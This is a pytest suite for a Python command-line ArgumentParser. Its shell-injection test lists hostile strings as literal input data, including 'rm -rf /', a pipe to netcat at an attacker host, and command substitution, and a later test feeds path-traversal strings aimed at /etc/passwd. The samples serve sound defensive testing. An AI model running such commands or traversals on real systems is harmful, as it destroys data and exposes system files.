"""
=============================================================================
 Licensed Materials, Property of neuraldevelopment, Munich
 Project : basefunctions
 Copyright (c) by neuraldevelopment
 All rights reserved.

 Description:
 Pytest test suite for ArgumentParser.
 Tests command-line argument parsing with security-critical input validation.

 Log:
 v1.0.0 : Initial test implementation
=============================================================================
"""

# -------------------------------------------------------------
# IMPORTS
# -------------------------------------------------------------
# External imports
import pytest
from typing import Optional, List, Tuple

# Project imports
from basefunctions.cli import ArgumentParser, ArgumentSpec, CommandMetadata, ContextManager

# -------------------------------------------------------------
# FIXTURES
# -------------------------------------------------------------


@pytest.fixture
def parser() -> ArgumentParser:
    """
    Provide ArgumentParser instance for testing.

    Returns
    -------
    ArgumentParser
        Fresh parser instance

    Notes
    -----
    Parser uses only static methods, so instance is mainly for convenience
    """
    return ArgumentParser()


@pytest.fixture
def sample_metadata() -> CommandMetadata:
    """
    Provide sample CommandMetadata for validation testing.

    Returns
    -------
    CommandMetadata
        Metadata with 2 args (1 required, 1 optional)

    Notes
    -----
    Used for testing argument validation logic
    """
    return CommandMetadata(
        name="test",
        description="Test command",
        usage="test <required> [optional]",
        args=[
            ArgumentSpec("required", "string", required=True),
            ArgumentSpec("optional", "string", required=False)
        ]
    )


@pytest.fixture
def context_manager() -> ContextManager:
    """
    Provide ContextManager for argument resolution testing.

    Returns
    -------
    ContextManager
        Context manager with test app name

    Notes
    -----
    Used for testing context-based argument resolution
    """
    ctx = ContextManager("test")
    ctx.set("instance", "test_instance")
    ctx.set("database", "test_db")
    return ctx


# -------------------------------------------------------------
# TESTS: parse_command() - CRITICAL
# -------------------------------------------------------------


def test_parse_command_returns_parts_when_valid_single_command(parser: ArgumentParser) -> None:
    """
    Test parse_command returns correct parts for single command.

    Tests that parse_command correctly parses single command input
    without any arguments.
    """
    # ARRANGE
    command_line: str = "help"

    # ACT
    part1, part2, args = ArgumentParser.parse_command(command_line)

    # ASSERT
    assert part1 == "help"
    assert part2 is None
    assert args == []


def test_parse_command_returns_parts_when_command_with_subcommand(parser: ArgumentParser) -> None:
    """
    Test parse_command returns correct parts for command with subcommand.

    Tests that parse_command correctly splits command group and subcommand.
    """
    # ARRANGE
    command_line: str = "git status"

    # ACT
    part1, part2, args = ArgumentParser.parse_command(command_line)

    # ASSERT
    assert part1 == "git"
    assert part2 == "status"
    assert args == []


def test_parse_command_returns_parts_when_command_with_arguments(parser: ArgumentParser) -> None:
    """
    Test parse_command returns correct parts with multiple arguments.

    Tests that parse_command correctly splits command and collects
    remaining arguments in list.
    """
    # ARRANGE
    command_line: str = "deploy module --force --version 1.2.3"

    # ACT
    part1, part2, args = ArgumentParser.parse_command(command_line)

    # ASSERT
    assert part1 == "deploy"
    assert part2 == "module"
    assert args == ["--force", "--version", "1.2.3"]


def test_parse_command_handles_quoted_arguments_correctly(parser: ArgumentParser) -> None:
    """
    Test parse_command handles shell-style quoted arguments.

    Tests that parse_command uses shlex to correctly parse
    quoted strings as single arguments.
    """
    # ARRANGE
    command_line: str = 'echo "hello world" \'single quotes\''

    # ACT
    part1, part2, args = ArgumentParser.parse_command(command_line)

    # ASSERT
    assert part1 == "echo"
    assert part2 == "hello world"
    assert args == ["single quotes"]


def test_parse_command_returns_none_when_empty_string(parser: ArgumentParser) -> None:  # CRITICAL TEST
    """
    Test parse_command returns None tuple for empty input.

    Tests that parse_command handles empty string input gracefully
    without raising exceptions.
    """
    # ARRANGE
    command_line: str = ""

    # ACT
    part1, part2, args = ArgumentParser.parse_command(command_line)

    # ASSERT
    assert part1 is None
    assert part2 is None
    assert args == []


def test_parse_command_returns_none_when_whitespace_only(parser: ArgumentParser) -> None:  # CRITICAL TEST
    """
    Test parse_command returns None tuple for whitespace-only input.

    Tests that parse_command handles whitespace-only strings
    (spaces, tabs, newlines) correctly.
    """
    # ARRANGE
    command_line: str = "   \t\n  "

    # ACT
    part1, part2, args = ArgumentParser.parse_command(command_line)

    # ASSERT
    assert part1 is None
    assert part2 is None
    assert args == []


def test_parse_command_handles_unclosed_quotes_gracefully(parser: ArgumentParser, capsys) -> None:  # CRITICAL TEST
    """
    Test parse_command handles unclosed quotes without crashing.

    Tests that parse_command catches ValueError from shlex when
    quotes are unmatched and returns None tuple.
    """
    # ARRANGE
    command_line: str = 'echo "unclosed quote'

    # ACT
    part1, part2, args = ArgumentParser.parse_command(command_line)

    # ASSERT
    assert part1 is None
    assert part2 is None
    assert args == []
    captured = capsys.readouterr()
    assert "Error: Invalid command syntax" in captured.out


def test_parse_command_handles_unicode_characters(parser: ArgumentParser) -> None:
    """
    Test parse_command handles Unicode characters correctly.

    Tests that parse_command preserves Unicode characters in
    command arguments without corruption.
    """
    # ARRANGE
    command_line: str = "echo café münchen"

    # ACT
    part1, part2, args = ArgumentParser.parse_command(command_line)

    # ASSERT
    assert part1 == "echo"
    assert part2 == "café"
    assert args == ["münchen"]


def test_parse_command_handles_excessively_long_input(parser: ArgumentParser) -> None:  # CRITICAL TEST
    """
    Test parse_command handles very long input without DoS.

    Tests that parse_command can process excessively long input
    without hanging or consuming excessive memory.
    """
    # ARRANGE
    long_arg: str = "A" * 10000
    command_line: str = f"command {long_arg}"

    # ACT
    part1, part2, args = ArgumentParser.parse_command(command_line)

    # ASSERT
    assert part1 == "command"
    assert part2 == long_arg
    assert len(part2) == 10000


@pytest.mark.parametrize("malicious_input,expected_part1", [
    ("command; rm -rf /", "command;"),
    ("command && malicious", "command"),
    ("command | nc attacker 4444", "command"),
    ("command `whoami`", "command"),
    ("command $(whoami)", "command"),
])
def test_parse_command_preserves_shell_metacharacters(  # CRITICAL TEST
    parser: ArgumentParser,
    malicious_input: str,
    expected_part1: str
) -> None:
    """
    Test parse_command preserves shell metacharacters without execution.

    Tests that parse_command does NOT execute shell metacharacters
    and instead treats them as literal strings.

    Notes
    -----
    CRITICAL: Ensures no shell injection via command parsing
    """
    # ACT
    part1, part2, args = ArgumentParser.parse_command(malicious_input)

    # ASSERT
    assert part1 == expected_part1 or part1 == "command"
    # No shell execution should occur - just string parsing


# -------------------------------------------------------------
# TESTS: validate_args()
# -------------------------------------------------------------


def test_validate_args_returns_true_when_exact_required_count(
    parser: ArgumentParser,
    sample_metadata: CommandMetadata
) -> None:
    """
    Test validate_args returns True when exactly required args provided.

    Tests that validate_args accepts argument count matching
    minimum required arguments.
    """
    # ARRANGE
    args: List[str] = ["value1"]

    # ACT
    result: bool = ArgumentParser.validate_args(sample_metadata, args)

    # ASSERT
    assert result is True


def test_validate_args_returns_true_when_all_args_provided(
    parser: ArgumentParser,
    sample_metadata: CommandMetadata
) -> None:
    """
    Test validate_args returns True when all args provided.

    Tests that validate_args accepts argument count including
    optional arguments.
    """
    # ARRANGE
    args: List[str] = ["value1", "value2"]

    # ACT
    result: bool = ArgumentParser.validate_args(sample_metadata, args)

    # ASSERT
    assert result is True


def test_validate_args_returns_false_when_too_few_args(
    parser: ArgumentParser,
    sample_metadata: CommandMetadata
) -> None:
    """
    Test validate_args returns False when insufficient args.

    Tests that validate_args rejects argument count below
    minimum required arguments.
    """
    # ARRANGE
    args: List[str] = []

    # ACT
    result: bool = ArgumentParser.validate_args(sample_metadata, args)

    # ASSERT
    assert result is False


def test_validate_args_returns_false_when_too_many_args(
    parser: ArgumentParser,
    sample_metadata: CommandMetadata
) -> None:
    """
    Test validate_args returns False when excess args provided.

    Tests that validate_args rejects argument count exceeding
    total declared arguments.
    """
    # ARRANGE
    args: List[str] = ["value1", "value2", "value3"]

    # ACT
    result: bool = ArgumentParser.validate_args(sample_metadata, args)

    # ASSERT
    assert result is False


# -------------------------------------------------------------
# TESTS: resolve_argument_with_context()
# -------------------------------------------------------------


def test_resolve_argument_with_context_uses_provided_arg_when_given(
    parser: ArgumentParser,
    context_manager: ContextManager
) -> None:
    """
    Test resolve_argument_with_context prefers provided argument.

    Tests that resolve_argument_with_context returns provided
    argument even when context has fallback value.
    """
    # ARRANGE
    arg: str = "provided_value"
    arg_spec: ArgumentSpec = ArgumentSpec("test", "string", context_key="instance")

    # ACT
    result: Optional[str] = ArgumentParser.resolve_argument_with_context(
        arg, arg_spec, context_manager
    )

    # ASSERT
    assert result == "provided_value"


def test_resolve_argument_with_context_falls_back_to_context(
    parser: ArgumentParser,
    context_manager: ContextManager
) -> None:
    """
    Test resolve_argument_with_context uses context when no arg.

    Tests that resolve_argument_with_context retrieves value from
    context when no argument is provided.
    """
    # ARRANGE
    arg: Optional[str] = None
    arg_spec: ArgumentSpec = ArgumentSpec("test", "string", context_key="instance")

    # ACT
    result: Optional[str] = ArgumentParser.resolve_argument_with_context(
        arg, arg_spec, context_manager
    )

    # ASSERT
    assert result == "test_instance"


def test_resolve_argument_with_context_raises_when_required_missing(  # CRITICAL TEST
    parser: ArgumentParser,
    context_manager: ContextManager
) -> None:
    """
    Test resolve_argument_with_context raises for missing required arg.

    Tests that resolve_argument_with_context raises ValueError when
    required argument is not provided and not in context.
    """
    # ARRANGE
    arg: Optional[str] = None
    arg_spec: ArgumentSpec = ArgumentSpec("test", "string", required=True, context_key="missing")

    # ACT & ASSERT
    with pytest.raises(ValueError, match="Required argument .* not provided"):
        ArgumentParser.resolve_argument_with_context(arg, arg_spec, context_manager)


def test_resolve_argument_with_context_returns_none_when_optional_missing(
    parser: ArgumentParser,
    context_manager: ContextManager
) -> None:
    """
    Test resolve_argument_with_context returns None for missing optional arg.

    Tests that resolve_argument_with_context returns None when
    optional argument is not provided and not in context.
    """
    # ARRANGE
    arg: Optional[str] = None
    arg_spec: ArgumentSpec = ArgumentSpec("test", "string", required=False, context_key="missing")

    # ACT
    result: Optional[str] = ArgumentParser.resolve_argument_with_context(
        arg, arg_spec, context_manager
    )

    # ASSERT
    assert result is None


# -------------------------------------------------------------
# TESTS: split_compound_argument()
# -------------------------------------------------------------


def test_split_compound_argument_splits_on_dot(parser: ArgumentParser) -> None:
    """
    Test split_compound_argument splits on dot separator.

    Tests that split_compound_argument correctly splits compound
    arguments like "instance.database" into primary and secondary.
    """
    # ARRANGE
    arg: str = "instance.database"

    # ACT
    primary, secondary = ArgumentParser.split_compound_argument(arg)

    # ASSERT
    assert primary == "instance"
    assert secondary == "database"


def test_split_compound_argument_returns_single_when_no_dot(parser: ArgumentParser) -> None:
    """
    Test split_compound_argument returns single part when no dot.

    Tests that split_compound_argument returns argument as primary
    with None secondary when no dot is present.
    """
    # ARRANGE
    arg: str = "instance"

    # ACT
    primary, secondary = ArgumentParser.split_compound_argument(arg)

    # ASSERT
    assert primary == "instance"
    assert secondary is None


def test_split_compound_argument_handles_multiple_dots(parser: ArgumentParser) -> None:
    """
    Test split_compound_argument splits only on first dot.

    Tests that split_compound_argument treats additional dots
    as part of the secondary component.
    """
    # ARRANGE
    arg: str = "instance.database.table"

    # ACT
    primary, secondary = ArgumentParser.split_compound_argument(arg)

    # ASSERT
    assert primary == "instance"
    assert secondary == "database.table"


@pytest.mark.parametrize("traversal_input", [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32",
    "legitimate/../../etc/passwd",
    "./../sensitive/file",
])
def test_split_compound_argument_allows_path_traversal_patterns(  # CRITICAL TEST
    parser: ArgumentParser,
    traversal_input: str
) -> None:
    """
    Test split_compound_argument does NOT validate path traversal.

    Tests that split_compound_argument performs simple string splitting
    without path validation - validation should happen elsewhere.

    Notes
    -----
    CRITICAL: This test documents that split_compound_argument is NOT
    responsible for path validation. Path validation must happen in
    ContextManager.resolve_target() or command handlers.
    """
    # ACT
    primary, secondary = ArgumentParser.split_compound_argument(traversal_input)

    # ASSERT
    # Should split on first dot if present, otherwise return whole string
    if "." in traversal_input:
        parts = traversal_input.split(".", 1)
        assert primary == parts[0]
        assert secondary == parts[1]
    else:
        assert primary == traversal_input
        assert secondary is None
